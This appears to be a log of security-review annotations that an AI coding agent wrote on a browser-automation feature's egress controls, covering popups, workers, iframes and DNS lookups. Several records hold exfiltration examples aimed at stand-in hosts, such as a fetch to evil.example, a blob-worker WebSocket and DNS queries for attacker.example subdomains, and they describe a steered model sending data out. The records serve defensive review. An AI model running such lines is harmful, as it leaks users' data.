{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:25.285960Z","id":"e1548904da3a37574ee9bfb3b349133aed017578f6fc5c675f1b25508b3912cd","body":{"kind":"resolve","ref":"git:71e4a855b","summary":"Fixed in 71e4a855b: The browser session auto-attaches new targets paused (Target.setAutoAttach waitForDebuggerOnStart) and Driver::handle closes each that is not the test's page, listed blocked why popup; browser::session::tests::a_popup_is_closed_before_it_loads passes. Held against FakeChrome only: see the concern recorded on session.rs's Target.setAutoAttach. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"68df9a00ae06a362f58ec3d3b8adc96c834330c26aa19d07a482bbb3557b094e","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:25.660277Z","id":"b8e8ef5d16aebf63610f9b8223a40d21bfd7732dd03c22d3407cde77e70f1ae0","body":{"kind":"resolve","ref":"git:be7165716","summary":"Fixed in be7165716: totalMs is the time left less HOOK_SLACK_MS (6 s: the hook's 5 s use() wait and the way back); browser::session::tests::saved_tests_run_through_the_bridge_hook pins totalMs 54000 of a 60 s cap and passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"f06b60496c74b9a6caf755d68155247f58c383012d379e8ba64f5ae44d26454e","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:26.401589Z","id":"30a8e7c9469460ee12292eb35baaabb99de2fdd140966e2bf1e309cecd2b49a0","body":{"kind":"resolve","ref":"git:835edf396","summary":"Fixed in 835edf396: Site::answer answers 404 for a /_clax/ path holding %2F, %5C or %2E without asking the host, and BrowserSource::clax_file/site_api docs state the encoded-path contract; browser::serve::tests::api_gets_go_to_the_host_and_writes_are_refused covers three such paths and passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"0a3c37b4d55e688a399fac24f40953a3f58f897bfe4199dc9b3e88321efa309e","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:26.664568Z","id":"197767533e2b27d42fca8d3b74e6254f571ac0cc561b72d9aafd5b215421d7bb","body":{"detail":"Driver::open sends Target.setAutoAttach on the browser session and Driver::handle closes every attached target that is not the test's page (session.rs 600-614). browser::session::tests::a_popup_is_closed_before_it_loads drives this against FakeChrome, which announces the popup as Chrome documents it (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach). Whether Browser Run's Chrome defers a popup's first request while it waits for the debugger, and that our own page's targetId from Target.createTarget is the one auto-attach reports (not a tab target's), is checkable only against a real browser.","kind":"concern","span":{"start":{"line":928},"end":{"line":937},"content_hash":"024eb9695d671d08f267887f3292f20e4db340c7659d67a77c534bcf44d6fec9"},"suggested_fix":"In the opt-in live test (docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 19), add a page whose click runs window.open to another origin and a target=_blank link, and assert neither request reaches the network (requests.blocked lists why popup) and the test's own page is not closed.","summary":"Closing popups rests on Target.setAutoAttach {waitForDebuggerOnStart} holding a new page's navigation until it is resumed, which only the fake shows","tags":["review","review:browser-phase1","revisit:the live Browser Run test exists","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:26.664674Z","id":"decf9677c1a64afcf9288098547ccd8fffc678a739d30c569c4fd300db6b05a1","body":{"detail":"Spec §5.1 lists why values only by example (origin, csp in §6.4); §5.2 says nothing of dialogs. Accepting keeps a confirm() from holding the page until the deadline; a test that wants to see a dialog reads the console entry.","kind":"comment","span":{"start":{"line":600},"end":{"line":632},"content_hash":"ef066b4db77fdedc298bd80135bb244d827a617f0b0b9b29804310eddf45ac23"},"summary":"Two behaviours spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md does not name: popups are listed blocked with why popup (other targets why target), and JavaScript dialogs are accepted at once, noted in the console as '<type> dialog, accepted: <message>'","tags":["review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:57:07.304865Z","id":"4aec4880da076792933570d53bb6566ebbdba2ed3a707c4a31afcae5cf9d15c1","body":{"kind":"comment","references":"ee9cc794a7b22fa59a4ef86c7f1569a36fc751eee688c1b9e3ca6269f4425377","summary":"Still open after crates/clax-server/src/browser_source.rs: Cloudflare's Browser Run pages (developers.cloudflare.com/browser-run/cdp/) document no response header carrying the session ID on the wss upgrade of /devtools/browser. The documented ways are an HTTP create session (POST .../devtools/browser, which answers sessionId) followed by the socket at /devtools/browser/{session_id}, or the sessions list (GET .../browser-rendering/devtools/session). Doing it means DaemonBrowser::open makes that POST first and CdpTransport answers the ID (a default method returning None), so TestRun and the bot.browser record can carry it. Not done: one more round trip and request shape that only the opt-in live test (plan Task 19) can check.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:24:00.154119Z","id":"7e18772a2d9fd29c90856fdff230709ec2f4032264ace312276fc7ca9c214b6d","body":{"kind":"comment","references":"ee9cc794a7b22fa59a4ef86c7f1569a36fc751eee688c1b9e3ca6269f4425377","summary":"Not checked: crates/clax-server/tests/live_browser_run.rs records every CDP frame of the real socket (its Recording source), which is where a session ID in Browser Run's answers could be looked for, but it has not been run against Cloudflare (no credentials). Whoever runs just browser-live can print the frames' first answers to see whether any carries the session ID before building the create-session POST of reply 4aec4880.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:49:36.649804Z","id":"864b8e22f60102a195665ac73ce36a45377c0837174935a2de7dc1f0aaa57cd4","body":{"detail":"BrowsePolicy asks BrowserSource::host_public once per name per browse (DaemonBrowser: the system resolver, every address public by web_source::is_public). Browser Run resolves the name again on Cloudflare's network, so a name answering a public address to the daemon and a private one to Cloudflare (rebinding, split horizon, a short TTL) is continued. Literals, localhost and the instance's own hosts are refused by what the URL says (BrowseScope::refusal), whoever resolves. Accepted because Browser Run fetches from Cloudflare's network, where the instance's private ranges are not reachable, and browsing is off by default (browser.browse.enabled).","kind":"waiver","span":{"start":{"line":39},"end":{"line":44},"content_hash":"0150f721d38c051bbedfb567f104a4e7fea19366d2d6db39be1947982cedf69b"},"summary":"A browse's name check is the daemon's resolver, not Cloudflare's: DNS rebinding and names that resolve differently from Browser Run's network reach what the check refused","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:49:36.649874Z","id":"9331332f6bf3bd7585d8d66c9b1a235cf4c23c774e652e41d54d3c597ea9ad9e","body":{"detail":"With subresources free, a model steered into eval of fetch('https://evil.example/?d=…') or new Image().src = … sends data to any host under every rule, which makes sender and allowlist bound only where a browse starts and contradicts waiver e688825f (data into URLs only under any_public). BrowseScope::admits_host applies to every paused request (documents, redirects, scripts, images, fetch, beacons). Cost: pages that load from CDNs the rule does not name render without those parts; each is listed blocked, why rule. Tests: browse.rs sender_rule_admits_only_the_senders_urls, tests/browser.rs a_browse_page_reaches_only_what_the_rule_admits.","kind":"comment","span":{"start":{"line":32},"end":{"line":38},"content_hash":"b13778e8059efb7bd90491fb2343083f542cfb02324a91dde03c2e20bc71a4e0"},"summary":"Decision: under the sender and allowlist rules every request a browsed page makes is held to the rule's hosts, narrowing spec §9.3, where subresources load from anywhere public","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:49:36.649910Z","id":"7e9cbe65a92f6cbb40fd2ae7dbf6a8e0766f868c7ef9dc248e4c5193a8f3bafa","body":{"detail":"Not taken: it lets eval or a page script send data to any host under sender and allowlist (see the decision on lines 32-38). A middle way would admit GET subresources (scripts, styles, images, fonts) from any public host while holding documents, fetch/XHR and non-GET requests to the rule's hosts; GET queries still carry data, so it narrows less than it looks.","kind":"alternative","span":{"start":{"line":178},"end":{"line":191},"content_hash":"14cc81f30dd22694a27f49b516f692a304f5d879ded88136e4b49b26859b0093"},"summary":"Let a browsed page's subresources load from any public host under every rule, as spec §9.3 is written","tags":["revisit:admins report browsed pages under sender or allowlist rendering too broken to read","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:49:36.649941Z","id":"516f864cffd324246adadecd2a260cbc3a8ebcb24a24e17b4e9520614da56c02","body":{"detail":"So http://example.com redirecting to https://www.example.com/ loads, and links within the sender's site load when clicked, while a goto to another page of that host is refused (spec §9.2 requires the exact URL for start and goto). Subdomains other than www are not admitted: without a public-suffix list there is no safe notion of the same site.","kind":"comment","span":{"start":{"line":178},"end":{"line":191},"content_hash":"14cc81f30dd22694a27f49b516f692a304f5d879ded88136e4b49b26859b0093"},"summary":"Under the sender rule a page may reach the hosts of the sender's URLs with a leading www. on either side ignored; the start URL and each goto must still equal a sender URL","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:49:36.650022Z","id":"a6242a150f3c0050a12eb355ebd66f188db6c742aca586c4a385a069c99005af","body":{"detail":"A test's page is held to its site's connect-src 'self'; a browsed page is under no policy of Clax's, so a socket to 127.0.0.1 or an unadmitted host would bypass the egress rule. Pages that need sockets break under browse. EventSource and sendBeacon are HTTP requests and pass through Fetch. Pinned by session.rs the_preamble_names_the_window_only_for_a_test and a_browse_session_blocks_private_requests_and_continues_public_ones.","kind":"comment","span":{"start":{"line":235},"end":{"line":235},"content_hash":"2b4beefbfb9b624a7758148a5f3233de1654dee5258c74ff521fb1a3136e3d80"},"summary":"A browse's preamble also removes WebSocket and WebTransport: their connections are outside the Fetch domain, so BrowsePolicy never sees them","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/access.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:50:06.730642Z","id":"2b585943304f8bd8c95ba1a5c3632f784bc1f11b3eaa28a5165c841e0edfefb9","body":{"kind":"resolve","ref":"git:3609b254a","summary":"Taken: BrowseRule moved to crates/clax-bot/src/browser/browse.rs, re-exported from browser/mod.rs; access.rs imports it.","supersedes":"c57c0de8733614ceeea93371264bed98e0a34e3bfda10cb41ad303661dc86586","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:59:47.666579Z","id":"c0662fc3923e69a2cc135aa8e86eff5404c31224fffc2b7b7f70606e8cceb8a5","body":{"detail":"Driver::open (crates/clax-bot/src/browser/session.rs, step 3) enables Fetch on the page's own session only and sends Target.setAutoAttach on the browser session, which attaches top-level targets (popups, service and shared workers), not a page's out-of-process iframes or dedicated workers (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach: related targets of the session it is sent on). Record d0d06f64 names this gap for tests and accepts it as defence in depth because the site's CSP (connect-src 'self') still holds; a browse has no CSP of Clax's, so here it is the only control. Concretely, under sender or allowlist an eval step (or a page script) such as `new Worker(URL.createObjectURL(new Blob([\"new WebSocket('wss://evil.example/?d=...')\"])))` opens a socket the Fetch domain never sees, in a realm where preamble_js (Page.addScriptToEvaluateOnNewDocument, documents only) never removed WebSocket or WebTransport; a cross-site iframe on an admitted host loads its subresources outside the page's Fetch. Decision 9331332f and reply 83552a8c on docs/superpowers/specs say under sender and allowlist data can leave only for a host the rule names, and clax.d.ts's browse doc tells the model the page's requests reach only the rule's hosts. None of this is checkable with FakeChrome, and crates/clax-server/tests/live_browser_run.rs runs no browse.","kind":"concern","span":{"start":{"line":19},"end":{"line":44},"content_hash":"b21e4fae5143114832542135b7c187cdb530b5411a689d30a4757a2e059daa36"},"suggested_fix":"In a browse, send Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} on the page session too, and for each attached iframe or worker session enable Fetch with the same BrowsePolicy before Runtime.runIfWaitingForDebugger (or close workers, as popups are); then check against real Browser Run that a blob worker's WebSocket and a cross-site iframe's fetch are refused. Until then, narrow the module docs, the d.ts sentence and reply 83552a8c to what is enforced.","summary":"A browse's requests from out-of-process iframes and dedicated workers, and a worker's WebSocket, bypass BrowsePolicy and the preamble, so sender and allowlist do not bound where data can go","tags":["review","review:browser-final","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T09:59:47.666611Z","id":"da13985fdc6341eabe6ead725e245e2e595800ae326e8eb602aa1018ce4f7a00","body":{"detail":"BrowsePolicy::decide asks BrowserSource::host_public for every domain a paused request names once BrowseScope::refusal passes it; under any_public that is every public-looking name, chosen by the page (DaemonBrowser::host_public, crates/clax-server/src/browser_source.rs, the system resolver). So a page (or a steered eval) makes the instance's network send DNS queries for `<data>.attacker.example`: the channel spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §6.4 waives for Browser Run's resolver now also leaves from the daemon's resolver, which for a local daemon is the person's home or corporate resolver and tells the attacker's authoritative server where the instance runs. Each lookup is awaited inside Driver::handle before the next event is read (Cdp::bounded), and `resolved` caches by name only, so a page requesting thousands of distinct subdomains spends the call's time on lookups. Waiver 864b8e22 accepts the resolver's answer being wrong (rebinding), not who sends the query; under sender and allowlist the rule refuses unnamed hosts before any lookup, so this is any_public's alone.","kind":"concern","span":{"start":{"line":287},"end":{"line":326},"content_hash":"f6484f5b2316fbfda497ad9d477bc0985b7bb97527acfed7b81dd5a5bfa89587"},"suggested_fix":"Either cap the names one browse may resolve (say 64, then refuse why `private` with a note in truncated), or record a waiver beside 864b8e22 that any_public lets a page make the instance resolve names it picks, and say so on the admin page's any_public risk line.","summary":"Under any_public a browsed page chooses names the instance's own resolver looks up: one lookup per distinct name, serially, with no cap","tags":["review","review:browser-final","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:04:00.502698Z","id":"112eea9435441e9e1fd023552121e9b7feacb66f18c626c220627171a6c0ca5c","body":{"detail":"crates/clax-bot/src/browser/session.rs:968-972 sends Target.setAutoAttach through browser_call (the browser session), and :975-977 sends Fetch.enable through page_call only; no setAutoAttach is sent on the page session and no Fetch.enable on any attached session. The CDP reference (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach) scopes auto-attach to targets related to the session it is sent on, so a page's dedicated workers and out-of-process iframes are not attached and not closed by the handler at :635-650. The preamble is installed with Page.addScriptToEvaluateOnNewDocument (:996), which runs in documents, not worker realms. crates/clax-bot/src/browser/browse.rs:19-44 and crates/clax-bot/src/clax.d.ts:244 (\"the page's own requests reach only the hosts that rule admits\") state the stronger guarantee; record d0d06f64 accepted the same gap for tests only because the site's CSP still holds.","kind":"comment","references":"c0662fc3923e69a2cc135aa8e86eff5404c31224fffc2b7b7f70606e8cceb8a5","span":{"start":{"line":19},"end":{"line":44},"content_hash":"b21e4fae5143114832542135b7c187cdb530b5411a689d30a4757a2e059daa36"},"summary":"confirmed: auto-attach and Fetch cover the page and top-level targets only, while the docs promise every request is held to the rule","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:04:00.503085Z","id":"31a02c8877d7d9892ea6e3a5a601616330041f53191477f92eb7c9f3d749dbb0","body":{"detail":"crates/clax-bot/src/browser/browse.rs:313-325: decide returns early only on scope.refusal (which refuses unadmitted hosts with WHY_RULE, :259-260, so sender and allowlist never reach the lookup), then calls self.public(name), which caches by name in an unbounded BTreeMap (:272-305) and otherwise awaits source.host_public. DaemonBrowser::host_public (crates/clax-server/src/browser_source.rs:524-539) uses self.lookup, SystemLookup by default (:122). Waiver 864b8e22 accepts a wrong answer from the resolver (rebinding), not the daemon sending page-chosen queries; spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md:497-499 waives only Chrome's prefetch and Browser Run's resolver.","kind":"comment","references":"da13985fdc6341eabe6ead725e245e2e595800ae326e8eb602aa1018ce4f7a00","span":{"start":{"line":287},"end":{"line":326},"content_hash":"f6484f5b2316fbfda497ad9d477bc0985b7bb97527acfed7b81dd5a5bfa89587"},"summary":"confirmed: under any_public every page-chosen name is resolved by the daemon's own resolver, with no cap","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:23:25.642222Z","id":"6f65bfa55175f0b4098de52ea16103bda2271a624fafda10d6e83a7d11600933","body":{"kind":"resolve","ref":"git:99ff61473","summary":"BrowsePolicy asks the resolver about at most MAX_NAMES (64) names per browse; a request to a new name past them is blocked, why names. browser::browse::tests::a_browse_asks_the_resolver_about_a_bounded_number_of_names passes (bazel test //crates/clax-bot:clax_bot_lib_test: PASSED). Up to 64 page-chosen names a browse still leave from the daemon's resolver under any_public.","supersedes":"da13985fdc6341eabe6ead725e245e2e595800ae326e8eb602aa1018ce4f7a00","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/access.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:12.810588Z","id":"c56c644b6ece2edd0c763a60676cdef91ae51a88d4b1bd84b0c91dc22d81c6ae","body":{"detail":"Spec §10.1 lists one time setting, browser.test_seconds, yet §4.5 gives BrowseGrant its own seconds. BrowserAccess::now fills both TestGrant::seconds and BrowseGrant::seconds from browser.test_seconds (crates/clax-bot/src/browser/access.rs, let seconds = ...), so one admin setting bounds every browser session and nothing new is stored.","kind":"alternative","span":{"start":{"line":101},"end":{"line":109},"content_hash":"749169a3175427d7bfde4d3d5aa7874f2cfda0eedc55119131c48a44c920007e"},"summary":"A browse's time cap of its own (browser.browse_seconds) instead of the per-test cap browser.test_seconds","supersedes":"4ba7a6bdca209df6af61ff4b86ebf360524ffb654925cfd83ea7dd56b7b1bcea","tags":["revisit:an admin needs browses capped apart from tests","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:13.010973Z","id":"dd9cd4cd11475561c6ad35bfc1810d98c73cfb2384f6329ab700606af71a29ce","body":{"detail":"Spec §5.4 makes the deadline before the page loaded an error (browser_timeout, charged), and a setup refusal browser_unavailable with opened set; a bare Value cannot carry either, so outcome is a Result and the caller (plan Task 9) charges whenever the error's `opened` is true. The request policy is a trait (RequestPolicy, with TestPolicy over serve::Site) so plan Task 20's browse egress is another implementation rather than a branch inside run_test; Start (Test {origin, path} or Browse {url}) replaces origin_or_url and also resolves each goto. SessionLimits carries RunLimits::image_side, which scales screenshots through Page.captureScreenshot's clip.scale (session.rs `screenshot`), so no image is decoded in clax-bot.","kind":"comment","span":{"start":{"line":211},"end":{"line":221},"content_hash":"33749d7e2b1dd56001ed89a46fbedf05dfe6d4574beb843308417ca17825a2aa"},"summary":"run_test's interface departs from docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 7: TestRun::outcome is Result<Value, BrowserError>, not a bare result Value, and run_test takes Start, &dyn RequestPolicy and SessionLimits instead of origin_or_url, pages and serve","supersedes":"c6f33269eb80bfc469c19159b755338b1e25a018d15ed9ac18bd5ce2e2a9cc30","tags":["browser","plan-deviation","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:13.204274Z","id":"e3f77a90dc373a3f8aa59cebe30472eab377a0a9fada476d01baab2d65822e84","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §5.4 says a deadline or cancellation after the load does not throw; before the load, the deadline is browser_timeout, and a cancellation is answered clax_bot_sandbox::CODE_CANCELLED, as every other cancelled host call is. `opened` is true, so under §8.2 (a browser that opened is charged whatever it answered) plan Task 9 charges its time. A closed connection before the load is browser_unavailable retryable; a refused command there is browser_unavailable not retryable.","kind":"comment","span":{"start":{"line":417},"end":{"line":438},"content_hash":"e644f000a2bd67db5ab44ce25e52ac87479d34f0f631b8a6826dda63840bae47"},"summary":"A cancellation before the page loaded answers the sandbox's `cancelled` code with opened set; spec §5.4's table lists no code for it","supersedes":"99388a93803fecdae8244dfa8a30601d32368da604a4df158f36d914d14ccdad","tags":["browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/serve.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:13.401992Z","id":"32bb55125dfee1181ff103e74de23ae9c322a9f6d22da36f3d0748e6f37bda91","body":{"detail":"Wrapped pages carry the bare bridge URL `/_clax/bridge.js` (clax_core::wrap::wrap_page with an empty bridge version), because BrowserSource has no way to name the host's bridge version; the page's `?v=` query, when present, is dropped before clax_file. A host implementing clax_file and site_api (plan Task 13, crates/clax-server/src/browser_source.rs) must answer those shapes: clax_file(\"/_clax/bridge.js\"), clax_file(\"/_clax/bridge/<part>\"), site_api(person, artifact, \"/_clax/api/db/notes?limit=5\").","kind":"comment","span":{"start":{"line":247},"end":{"line":298},"content_hash":"8ea60815363c863972d4a15af67b1e076f6014bdb592ea839b236e33912c83f2"},"summary":"What a BrowserSource is asked by Site::answer: clax_file gets the path without its query; site_api gets the whole path and query, `/_clax/api/` included; GET and HEAD reach site_api","supersedes":"d46927a89a163a826f55028c2d6a956f22f05b1281ddc027d83f989b338afd64","tags":["browser","host-contract","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/serve.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:13.606651Z","id":"52c69e60f4c53b339101e5ab210261dcf131e14c51822e60b696ed064fa08340","body":{"detail":"The spec and the plan say an empty script, and the session also sets Network.setBypassServiceWorker, so a page's worker intercepts nothing during a test. An empty script still installs a no-op worker for the test's incognito context, which is discarded with it; the site's script would need BrowserSource to expose it (it is the host's), which the trait does not.","kind":"alternative","span":{"start":{"line":258},"end":{"line":262},"content_hash":"9d6c9b50a9b7fcd2a74b41f2bc90eedb5f9c0709e3e5aea202c69949c4395236"},"summary":"Answer a service worker's script with the site's own self-unregistering script (docs/contract.md, \"Sites\") instead of the empty script spec §6.2 names","supersedes":"4bcca3801f76a1ac72deb795df972bf3211ee981979869d58e1bca158e586cb1","tags":["browser","revisit:a test page misbehaves because its service worker registration resolves to an empty worker","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:13.809776Z","id":"11b7cb34b768d1c40301b115b226fd6c30fd0b9a6a4ec4aef1d37dfb55b48652","body":{"detail":"Spec §6.4 says every request whose origin is not the synthetic one is failed. Fetch.enable here applies to the page target attached in run_test (session.rs `open`). Whether Chrome reports a dedicated or shared worker's fetches, or a cross-origin iframe's subresources, as Fetch.requestPaused on the page session is not verified: FakeChrome cannot tell. The site's content security policy (connect-src 'self', default-src 'self') still refuses those origins, and .invalid never resolves, so the gap is defence in depth, beside the channels waiver 2c32e212 already accepts on the spec.","kind":"concern","span":{"start":{"line":974},"end":{"line":983},"content_hash":"704dd18b798995d05e9923f86d3b81ea51ee6f90d5d30c5e6f9f8c352b9824dd"},"suggested_fix":"In the opt-in live test (plan Task 19), load a page that starts a worker fetching another origin and frames another origin, and check each is listed as blocked; if not, add Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} and enable Fetch on each attached session before resuming it.","summary":"Request interception is enabled on the page's own session only: no Target.setAutoAttach, so out-of-process iframes and workers, which Chrome gives targets of their own, are not attached and their requests may not pass through Site::answer","supersedes":"d0d06f641ebfe3b330a9d84055214a114ae7c8177201f81028c8f3e53c3cb38d","tags":["browser","egress","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:14.013597Z","id":"369f1a796d8d465a8acb40fc682a96c3d69cddce66a9f1e0fbcb38badc419c3d","body":{"detail":"Driver::handle ignores Inspector.targetCrashed, Target.targetCrashed and Target.detachedFromTarget (https://chromedevtools.github.io/devtools-protocol/tot/Inspector/#event-targetCrashed). A page that exhausts memory (e.g. an artifact with a runaway array) crashes its renderer; pending Runtime.evaluate calls on its session then wait until the deadline, the result says the time ran out, and the full timeout is charged, while the useful answer is that the page crashed.","kind":"suggestion","span":{"start":{"line":634},"end":{"line":634},"content_hash":"928e1fdaae28c8ab5c887b5faaec8a4cd6e4a2377f552f104ae3b552d165d995"},"suggested_fix":"On a crash or detach event for self.session, end the test as after-load (push an error 'the page crashed' or 'the page closed', skip remaining steps) without waiting for the deadline; before load, answer browser_unavailable with opened set.","summary":"A crashed or detached page is not noticed: the driver waits for answers that never come until the deadline and reports \"time\" instead of the crash","supersedes":"a7552373ab329c7cfe383a9680fa15121f2e2857f04d56ff507b874e9f6a8266","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:14.217063Z","id":"9cf3f36dbaf7c2f47899f2e51665bab95d4c50269387700f12f867fc1f3d7132","body":{"detail":"Driver::open sends Target.setAutoAttach on the browser session and Driver::handle closes every attached target that is not the test's page (session.rs 600-614). browser::session::tests::a_popup_is_closed_before_it_loads drives this against FakeChrome, which announces the popup as Chrome documents it (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach). Whether Browser Run's Chrome defers a popup's first request while it waits for the debugger, and that our own page's targetId from Target.createTarget is the one auto-attach reports (not a tab target's), is checkable only against a real browser.","kind":"concern","span":{"start":{"line":963},"end":{"line":972},"content_hash":"024eb9695d671d08f267887f3292f20e4db340c7659d67a77c534bcf44d6fec9"},"suggested_fix":"In the opt-in live test (docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 19), add a page whose click runs window.open to another origin and a target=_blank link, and assert neither request reaches the network (requests.blocked lists why popup) and the test's own page is not closed.","summary":"Closing popups rests on Target.setAutoAttach {waitForDebuggerOnStart} holding a new page's navigation until it is resumed, which only the fake shows","supersedes":"197767533e2b27d42fca8d3b74e6254f571ac0cc561b72d9aafd5b215421d7bb","tags":["review","review:browser-phase1","revisit:the live Browser Run test 